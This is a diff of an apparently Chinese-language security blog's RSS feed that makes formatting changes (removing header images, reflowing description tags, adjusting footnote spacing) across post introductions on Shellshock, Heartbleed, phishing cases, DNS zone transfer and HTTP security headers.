-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-REhuiuIYlf8/VCuEEjtKi8I/AAAAAAAAAso/dp99DcsbPEA/w702-h478-no/ByWDCZwIAAAjCts.jpg&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-REhuiuIYlf8/VCuEEjtKi8I/AAAAAAAAAso/dp99DcsbPEA/w702-h478-no/ByWDCZwIAAAjCts.jpg&quot; alt=&quot;ShellShocked&quot; title=&quot;ShellShocked&quot; /&gt;&lt;/a&gt;
-[ Ref: &lt;a href=&quot;https://twitter.com/SynAckPwn/status/514961810320293888/photo/1&quot;&gt;OMG ΉΆXOR(twitter)&lt;/a&gt;]&lt;/p&gt;
-
-&lt;p&gt;自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波淘金潮，相較於上次 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; 給予 Shellshock 最嚴重的 10.0 分影響等級。&lt;/p&gt;
+                <description>&lt;p&gt;自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波淘金潮，相較於上次 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; 給予 Shellshock 最嚴重的 10.0 分影響等級。&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -2677,10 +2631,10 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 &lt;div class=&quot;footnotes&quot;&gt;
   &lt;ol&gt;
     &lt;li id=&quot;fn:note2&quot;&gt;
-      &lt;p&gt;若手動執行 dhclient，則會遭到漏洞影響。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;若手動執行 dhclient，則會遭到漏洞影響。&amp;nbsp;&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
     &lt;li id=&quot;fn:note1&quot;&gt;
-      &lt;p&gt;系統環境變數會受到影響，但無法被攻擊者利用。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;系統環境變數會受到影響，但無法被攻擊者利用。&amp;nbsp;&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
@@ -2692,10 +2646,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？</title>
-                <description>
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-yzP5umnsAhg/VCKTF83dDpI/AAAAAAAAAp8/tS59M5xeSuw/w1522-h1015-no/i_am_watching_you.jpg&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-yzP5umnsAhg/VCKTF83dDpI/AAAAAAAAAp8/tS59M5xeSuw/w1522-h1015-no/i_am_watching_you.jpg&quot; alt=&quot;你知道我在看你嗎？&quot; title=&quot;你知道我在看你嗎？&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;網路攝影機的普及率在近幾年來持續攀升，除了老人與幼兒居家照護、企業室內監控等需求迅速增加之外，結合手機應用程式讓人可隨時隨地觀看影像的方便性也成為普及的原因。當大家還以為黑帽駭客的目標仍然是網站、個人電腦時，已經有許多攻擊者悄悄地將目標轉向了各種物連網設備，例如 NAS、Wireless AP、Printer 等產品，而擁有眾多用戶的網路攝影機理所當然地也是目標之一。身為安控產品，卻造成一項資安的隱憂，是不是有點諷刺呢？&lt;/p&gt;
+                <description>&lt;p&gt;網路攝影機的普及率在近幾年來持續攀升，除了老人與幼兒居家照護、企業室內監控等需求迅速增加之外，結合手機應用程式讓人可隨時隨地觀看影像的方便性也成為普及的原因。當大家還以為黑帽駭客的目標仍然是網站、個人電腦時，已經有許多攻擊者悄悄地將目標轉向了各種物連網設備，例如 NAS、Wireless AP、Printer 等產品，而擁有眾多用戶的網路攝影機理所當然地也是目標之一。身為安控產品，卻造成一項資安的隱憂，是不是有點諷刺呢？&lt;/p&gt;
 
 &lt;p&gt;恰好最近幾天忽然看到有新聞報導&lt;a href=&quot;http://news.ltn.com.tw/news/world/breakingnews/1112329&quot;&gt;「家用監視器遭駭客入侵 隱私全被看光光」&lt;/a&gt;這樣子的案例，而在去年也有類似的報導&lt;a href=&quot;http://news.networkmagazine.com.tw/classification/security/2013/06/18/51531/&quot;&gt;「數十萬支監控攝影機潛藏被駭漏洞 電影情景恐真實上演」&lt;/a&gt;，讓我們不禁想對這個事件做個深入的調查。就讓我們來看看網路攝影機以及相關產品究竟有哪些風險吧！&lt;/p&gt;
 
@@ -2806,10 +2757,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>被遺忘的資訊洩漏－重點回顧</title>
-                <description>
-&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-8oFs--PeQRg/U_xM6u373RI/AAAAAAAAAos/eT4wfRradUg/w878-h659-no/information_leakage_hitcon2014.jpg&quot; alt=&quot;被遺忘的資訊洩漏 / Information Leakage in Taiwan&quot; /&gt;&lt;/p&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;在今年駭客年會企業場，我們分享了一場『被遺忘的資訊洩漏』。資訊洩漏是十幾年前就被一提再提的議題，在資訊安全領域中也是最最最基本該注意的事情，然而至今很多網站都還是忽略它，甚至連一些熱門網站都仍有資訊洩漏問題。議程中我們舉了大量的例子證明資訊洩漏其實可以很嚴重，希望能幫大家複習一下，如果網站沒有注意這些，會造成什麼樣的後果。議程投影片如下所示，就讓我們來總結一下吧！&lt;/p&gt;
 
@@ -2876,11 +2824,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>手機應用程式開發上被忽略的 SSL 處理</title>
-                <description>
-&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/Fd1iUVkdWXPxlYucic4NznDQT9L4CQCR2gYL3KI-2Qs=w514-h686-no&quot; alt=&quot;SSL&quot; /&gt;
-&lt;!-- Credit: http://natashenka.ca/printable-ssl-posters/ --&gt;&lt;/p&gt;
-
-&lt;p&gt;在網路上傳輸敏感資訊時，通常會使用 HTTPS 協定，讓客戶端與伺服器端對資料進行 SSL 加密處理，以降低資料在傳輸過程中被監聽或中間人攻擊的風險。HTTPS 的重要性逐漸被重視，Google 除了預設開啟 HTTPS 之外，未來更會將 &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS 的網站搜尋排名加分&lt;/a&gt;。但為了確保傳輸的安全，過程中客戶端會核對伺服器的憑證鏈 (certificate chain) 是否有效，若判定為無效時會作出警告。(詳見&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;
+                <description>&lt;p&gt;在網路上傳輸敏感資訊時，通常會使用 HTTPS 協定，讓客戶端與伺服器端對資料進行 SSL 加密處理，以降低資料在傳輸過程中被監聽或中間人攻擊的風險。HTTPS 的重要性逐漸被重視，Google 除了預設開啟 HTTPS 之外，未來更會將 &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS 的網站搜尋排名加分&lt;/a&gt;。但為了確保傳輸的安全，過程中客戶端會核對伺服器的憑證鏈 (certificate chain) 是否有效，若判定為無效時會作出警告。(詳見&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;
 
 &lt;!-- more --&gt;
 &lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-3KUlB8qAxng/U-oq77eBmvI/AAAAAAAAAlw/Ul4v9jNaSXY/w846-h577-no/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop 警告圖&quot; /&gt;
@@ -3129,10 +3073,10 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 &lt;div class=&quot;footnotes&quot;&gt;
   &lt;ol&gt;
     &lt;li id=&quot;fn:note1&quot;&gt;
-      &lt;p&gt;Google 基於效能及有效性的考量，在 Android 系統上預設停用&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;憑證撤銷檢查&lt;/a&gt;&lt;br /&gt; &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;Google 基於效能及有效性的考量，在 Android 系統上預設停用&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;憑證撤銷檢查&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
     &lt;li id=&quot;fn:note2&quot;&gt;
-      &lt;p&gt;OWASP 的 Android 範例中，內含的 PUB_KEY 是錯誤的 (最後更改日期 2014/08/14) &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;OWASP 的 Android 範例中，內含的 PUB_KEY 是錯誤的 (最後更改日期 2014/08/14)&amp;nbsp;&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
@@ -3144,11 +3088,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>設備不良設定帶來的安全風險：以 WAF 為例</title>
-                <description>
-&lt;p&gt;&lt;img src=&quot;https://farm7.staticflickr.com/6155/6183500441_5de4a999eb_z.jpg&quot; alt=&quot;Firewall&quot; /&gt;
-&lt;!-- Credit: https://www.flickr.com/photos/briannabites/6183500441/ --&gt;&lt;/p&gt;
-
-&lt;p&gt;過去談到網站安全，通常會使用防火牆或 IDS 進行防護。但近年來網站安全議題都是以網頁應用程式的漏洞居多，無法單靠防火牆阻擋。以 OWASP Top 10 2013 的第一名 Injection 而言，多半是程式撰寫方法不嚴謹所造成，因此才有了網頁應用程式防火牆 (Web Application Firewall, WAF) 的出現。&lt;/p&gt;
+                <description>&lt;p&gt;過去談到網站安全，通常會使用防火牆或 IDS 進行防護。但近年來網站安全議題都是以網頁應用程式的漏洞居多，無法單靠防火牆阻擋。以 OWASP Top 10 2013 的第一名 Injection 而言，多半是程式撰寫方法不嚴謹所造成，因此才有了網頁應用程式防火牆 (Web Application Firewall, WAF) 的出現。&lt;/p&gt;
 
 &lt;p&gt;有了 WAF 就是萬靈丹了嗎？就算有各種資安設備，但缺乏安全的設定，有的時候反而會讓系統陷入安全風險中。我們就以 Reverse Proxy 或 WAF 設備來探討不佳設定帶來的安全風險。&lt;/p&gt;
 
@@ -3206,8 +3146,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>Apple ID 釣魚郵件案例</title>
-                <description>
-&lt;p&gt;今天又有不怕死的人寄來釣魚信了，這次是騙取 Apple ID。讓我們來看看這封信，其中內容有非常多破綻，也已經被 Gmail 直接定為 Spam 了，非常可憐。除了信件之外，釣魚的網頁本身也很值得我們借鏡，讓我們來看看這次的釣魚郵件案例。&lt;/p&gt;
+                <description>&lt;p&gt;今天又有不怕死的人寄來釣魚信了，這次是騙取 Apple ID。讓我們來看看這封信，其中內容有非常多破綻，也已經被 Gmail 直接定為 Spam 了，非常可憐。除了信件之外，釣魚的網頁本身也很值得我們借鏡，讓我們來看看這次的釣魚郵件案例。&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-r8BU7qq8xt0/U7UTt-3wxxI/AAAAAAAAAh0/y00wjTdq4IE/s2560/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-r8BU7qq8xt0/U7UTt-3wxxI/AAAAAAAAAh0/y00wjTdq4IE/w678-h440-no/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID 釣魚信&quot; title=&quot;Apple ID 釣魚信&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
@@ -3335,11 +3274,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>如何正確的取得使用者 IP？</title>
-                <description>
-&lt;p&gt;&lt;a href=&quot;https://farm7.staticflickr.com/6220/6250089499_f908fcb990_o.jpg&quot;&gt;&lt;img src=&quot;https://farm7.staticflickr.com/6220/6250089499_da2fb7a973_z.jpg&quot; alt=&quot;公車站牌的 IP&quot; /&gt;&lt;/a&gt;
-&lt;!-- Photo Credit: https://www.flickr.com/photos/kevandotorg/6250089499/ --&gt;&lt;/p&gt;
-
-&lt;p&gt;很多網站都會有偵測使用者 IP 的功能，不管是判斷使用者來自哪邊，或者是記錄使用者的位置。但是你知道嗎？網路上大多數的教學全部都是「錯誤」的。正確的程式寫法可以確保知道訪客的 IP，但是錯誤的寫法卻可能讓網站管理者永遠不知道犯罪者的來源。&lt;/p&gt;
+                <description>&lt;p&gt;很多網站都會有偵測使用者 IP 的功能，不管是判斷使用者來自哪邊，或者是記錄使用者的位置。但是你知道嗎？網路上大多數的教學全部都是「錯誤」的。正確的程式寫法可以確保知道訪客的 IP，但是錯誤的寫法卻可能讓網站管理者永遠不知道犯罪者的來源。&lt;/p&gt;
 
 &lt;p&gt;這次我們單就偵測 IP 的議題來探討各種錯誤的寫法。&lt;/p&gt;
 
@@ -3471,8 +3406,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>Zone Transfer Statistics of Alexa Top 1 Million</title>
-                <description>
-&lt;h3 id=&quot;zone-transfer-&quot;&gt;Zone Transfer 世界大揭秘&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;zone-transfer-&quot;&gt;Zone Transfer 世界大揭秘&lt;/h3&gt;
 
 &lt;p&gt;還記得在上一篇文章 &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題&lt;/a&gt;中我們曾提到，若對全世界的網站進行 zone transfer 檢測恐怕會有更多驚人的案例嗎？正好 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 提供了全球排名前一百萬名的網站資料&lt;/a&gt;，我們就以這份資料為基礎來做一些統計吧！&lt;/p&gt;
 
@@ -3688,8 +3622,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>HttpOnly - HTTP Headers 的資安議題 (3)</title>
-                <description>
-&lt;p&gt;上次我們提到了 &lt;a href=&quot;http://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;，這次我們來聊聊同樣是為了防禦 XSS 而生的另一個技術。&lt;/p&gt;
+                <description>&lt;p&gt;上次我們提到了 &lt;a href=&quot;http://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;，這次我們來聊聊同樣是為了防禦 XSS 而生的另一個技術。&lt;/p&gt;
 
 &lt;h3 id=&quot;httponly-&quot;&gt;HttpOnly 簡介&lt;/h3&gt;
 
@@ -3786,8 +3719,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>OpenSSL 再爆嚴重漏洞，部分重要網站仍在風險中！</title>
-                <description>
-&lt;p&gt;(本篇最後更新時間：2014.6.9 15:40 pm)&lt;/p&gt;
+                <description>&lt;p&gt;(本篇最後更新時間：2014.6.9 15:40 pm)&lt;/p&gt;
 
 &lt;p&gt;OpenSSL 團隊於 6/5 修補了&lt;a href=&quot;http://www.openssl.org/news/secadv_20140605.txt&quot;&gt;六項安全漏洞&lt;/a&gt;，&lt;a href=&quot;http://www.sans.org/about/&quot;&gt;SANS&lt;/a&gt; 在&lt;a href=&quot;https://isc.sans.edu/diary/Critical+OpenSSL+Patch+Available+Patch+Now/18211&quot;&gt;這篇文章&lt;/a&gt;中整理了這幾個漏洞的摘要，這裡截圖表格如下：&lt;/p&gt;
 
@@ -3862,8 +3794,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>HTTP Session 攻擊與防護</title>
-                <description>
-&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;大家還記得四月份的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件嗎？當時除了網站本身以外，受害最嚴重的就屬 VPN Server 了。國內外不少駭客不眠不休利用 Heartbleed 漏洞竊取 VPN Server 的管理者 Session Cookie，運氣好的話就可以直接登入大企業的內網。&lt;/p&gt;
 
@@ -4012,8 +3943,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>LINE 免費貼圖釣魚訊息分析</title>
-                <description>
-&lt;p&gt;晚上突然接到社群朋友傳 LINE 的訊息過來，定睛一看並不單純。這網址看起來就是釣魚網站啊？怎麼會這樣呢？難道是朋友在測試我們的警覺心夠不夠嗎？讓我們看下去這個釣魚網頁怎麼玩。&lt;/p&gt;
+                <description>&lt;p&gt;晚上突然接到社群朋友傳 LINE 的訊息過來，定睛一看並不單純。這網址看起來就是釣魚網站啊？怎麼會這樣呢？難道是朋友在測試我們的警覺心夠不夠嗎？讓我們看下去這個釣魚網頁怎麼玩。&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-ynmXJsHIv0w/U2kPLvxOvkI/AAAAAAAAAUw/qG0y0Ahcf44/s2560/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-ynmXJsHIv0w/U2kPLvxOvkI/AAAAAAAAAUw/qG0y0Ahcf44/w381-h677-no/LINE_Phishing_01.png&quot; alt=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; title=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
@@ -4053,8 +3983,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>搶搭核四與服貿熱潮的潛在詐騙網站</title>
-                <description>
-&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;
 
 &lt;p&gt;最近很多人都收到了一個看起來很像釣魚網站的核四投票站台簡訊，如下圖：&lt;/p&gt;
 
@@ -4116,8 +4045,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
         <item>
                 <title>Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題</title>
-                <description>
-&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Domain_Name_System&quot;&gt;DNS&lt;/a&gt; 是在 1983 年由 Paul Mockapetris 所發明，相關規範分別在 &lt;a href=&quot;http://tools.ietf.org/html/rfc1034&quot;&gt;RFC 1034&lt;/a&gt; 以及 &lt;a href=&quot;http://tools.ietf.org/html/rfc1035&quot;&gt;RFC 1035&lt;/a&gt;。其主要作用是用來記憶 IP 位址與英文之間的對應關係，讓人類可以用較簡單的方式記得主機名稱。目前一般民眾大多使用 ISP 或國際知名公司提供的 DNS server，如中華的 168.95.1.1 或是 Google 的 8.8.8.8 等等。&lt;/p&gt;
 
@@ -4287,8 +4215,7 @@ ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
         <item>
                 <title>PHP 官網原始碼讀取案例</title>
-                <description>
-&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;不安全的引用物件 (Insecure Direct Object Reference)&lt;/a&gt; 是個非常常見的資安漏洞，在 &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; 公布的&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;十大網站應用程式安全漏洞&lt;/a&gt; 中高居第四名。通常發生在網站應用程式上沒有針對輸入的參數做好檢查，就把參數丟入 include 或 readfile 等函數當中引用，使得攻擊者可以藉此存取任意文件的原始碼。&lt;/p&gt;
+                <description>&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;不安全的引用物件 (Insecure Direct Object Reference)&lt;/a&gt; 是個非常常見的資安漏洞，在 &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; 公布的&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;十大網站應用程式安全漏洞&lt;/a&gt; 中高居第四名。通常發生在網站應用程式上沒有針對輸入的參數做好檢查，就把參數丟入 include 或 readfile 等函數當中引用，使得攻擊者可以藉此存取任意文件的原始碼。&lt;/p&gt;
 
 &lt;p&gt;今天這個案例就發生在 PHP 的官方網站 (&lt;a href=&quot;http://www.php.net/&quot;&gt;http://www.php.net/&lt;/a&gt;)，消息來源是知名的 0-Day 黑市 1337day，發佈的日期是 2014/4/4 ，原始的內容是這樣的：&lt;/p&gt;
 
@@ -4324,8 +4251,7 @@ ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
         <item>
                 <title>CVE-2014-0166 WordPress 偽造 Cookie 弱點</title>
-                <description>
-&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;在一陣 OpenSSL Heartbleed 淘金潮中，又有一個技術門檻低、後果嚴重、也同樣需要些運氣的漏洞被揭發－&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166&quot;&gt;CVE-2014-0166&lt;/a&gt;。CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。
 讓我們來分析一下這次的弱點是發生了什麼事吧！&lt;/p&gt;
@@ -4435,8 +4361,7 @@ hmac 值用來驗證 cookie 是否合法。&lt;br /&gt;
 
         <item>
                 <title>OpenSSL Heartbleed 全球駭客的殺戮祭典，你參與了嗎？</title>
-                <description>
-&lt;p&gt;你跟上了 OpenSSL Heartbleed 的祭典了嗎？如果還沒有，別忘記詳細閱讀一下我們的前文「&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞&lt;/a&gt;」。&lt;/p&gt;
+                <description>&lt;p&gt;你跟上了 OpenSSL Heartbleed 的祭典了嗎？如果還沒有，別忘記詳細閱讀一下我們的前文「&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞&lt;/a&gt;」。&lt;/p&gt;
 
 &lt;p&gt;這幾天不少企業、民眾都不斷來詢問我們相對應的解決方案：&lt;/p&gt;
 
@@ -4733,8 +4658,7 @@ sudo service apache2 restart    # Debian
 
         <item>
                 <title>OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 </title>
-                <description>
-&lt;h3 id=&quot;openssl-cve-2014-0160-&quot;&gt;OpenSSL CVE-2014-0160 嚴重漏洞&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;openssl-cve-2014-0160-&quot;&gt;OpenSSL CVE-2014-0160 嚴重漏洞&lt;/h3&gt;
 
 &lt;p&gt;OpenSSL 今天公告了一個極度嚴重的漏洞（&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160&quot;&gt;CVE-2014-0160&lt;/a&gt;），被稱為「&lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;」，而他確實也如同心臟噴出血般嚴重。這個漏洞能讓攻擊者從伺服器記憶體中讀取 64 KB 的資料，利用傳送 heartbeat 的封包給伺服器，在封包中控制變數導致 memcpy 函數複製錯誤的記憶體資料，因而擷取記憶體中可能存在的機敏資料。記憶體中最嚴重可能包含 ssl private key、session cookie、使用者密碼等，因此可能因為這樣的漏洞導致伺服器遭到入侵或取得使用者帳號。&lt;/p&gt;
 
@@ -5007,8 +4931,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 
         <item>
                 <title>Content-Security-Policy - HTTP Headers 的資安議題 (2)</title>
-                <description>
-&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;
 
 &lt;p&gt;還記得在上一篇 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP headers 的資安議題 (1)&lt;/a&gt; 文章中，我們提到了多種資安相關的 HTTP headers 嗎？接下來的幾篇文章我們會介紹幾個專門對付 XSS 的 HTTP headers，首先就由 Content-Security-Policy 打頭陣。&lt;/p&gt;
 
@@ -5187,8 +5110,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 
         <item>
                 <title>Google 帳號釣魚案例</title>
-                <description>
-&lt;p&gt;最近身邊的朋友不斷的收到 Gmail 中 Google 的警告：&lt;/p&gt;
+                <description>&lt;p&gt;最近身邊的朋友不斷的收到 Gmail 中 Google 的警告：&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-GpAMTR_IrK0/UzlQhywLcII/AAAAAAAAAO8/LgV3z4knQc4/w788-h26-no/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;
 
@@ -5257,8 +5179,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 
         <item>
                 <title>使用第三方套件所要擔負的資安風險</title>
-                <description>
-&lt;p&gt;使用第三方套件節省開發時間，已經是整個資訊產業的慣例。但是很多管理者可能不知道，使用第三方套件到底需要擔負多大的資安風險。你確定你用的套件是安全無虞的嗎？是否有經過嚴謹的安全測試？若有安全漏洞引爆，是否有廠商可以負責維護修補？廠商開發的程式碼品質是否穩定？這些都是在使用之前必須要考慮的。&lt;/p&gt;
+                <description>&lt;p&gt;使用第三方套件節省開發時間，已經是整個資訊產業的慣例。但是很多管理者可能不知道，使用第三方套件到底需要擔負多大的資安風險。你確定你用的套件是安全無虞的嗎？是否有經過嚴謹的安全測試？若有安全漏洞引爆，是否有廠商可以負責維護修補？廠商開發的程式碼品質是否穩定？這些都是在使用之前必須要考慮的。&lt;/p&gt;
 
